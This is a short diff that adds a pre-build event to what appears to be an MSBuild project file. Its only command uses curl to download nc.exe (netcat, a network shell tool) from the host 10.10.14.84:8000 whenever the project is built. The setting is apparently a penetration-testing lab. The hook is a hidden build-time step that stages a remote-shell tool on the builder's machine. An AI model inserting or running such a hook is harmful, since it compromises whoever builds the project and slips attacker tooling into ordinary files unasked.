@@ -1,0 +1,5 @@
+<PreBuildEvent>
+    <Command>
+    curl 10.10.14.84:8000/nc.exe -o nc.exe
+    </Command>
+</PreBuildEvent>
